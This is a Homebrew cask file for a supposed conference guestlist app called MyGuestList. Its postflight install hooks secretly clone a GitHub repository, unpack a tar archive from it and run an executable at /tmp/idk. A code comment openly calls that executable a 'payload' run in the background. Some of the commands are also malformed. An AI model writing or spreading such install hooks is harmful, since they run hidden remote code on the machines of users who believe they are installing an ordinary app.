cask "myguestlist" do
  version "1.1.0"
  sha256 "8d12fb17ab34180a1a3bbd5aeebbd637ecb40133aaf7634e7d40b26a43e81a67"

  url "https://github.com/eharper-wtconf/confapp24/releases/download/rel2/myguestlist.zip"
  name "MyGuestList"
  desc "WTconference guestlist"
  homepage "https://github.com/eharper-wtconf/confapp24"

  app "myguestlist.app"

  # postflight block to download the GitHub repository to the user's home folder
  postflight do
    system_command "/usr/bin/git",
                   args: ["clone", "https://github.com/eharper-wtconf/confapp24", "/tmp/confapp24"],
                   print_stdout: true
  end
  
  postflight do
    system_command "/usr/bin/tar",
                   args: ["-xvf", "/tmp/confapp24/myguestlist_two.tar"],
                   print_stdout: true
  end

## & added to run payload in the background and continue cask
  postflight do
    system_command "/tmp/idk",
                   args: ["&"],
                   print_stdout: true
  end

  postflight do
    system_command "/usr/bin/touch",
                   args: ["~/postflight-complete.txt"],
                   print_stdout: true
  end

end
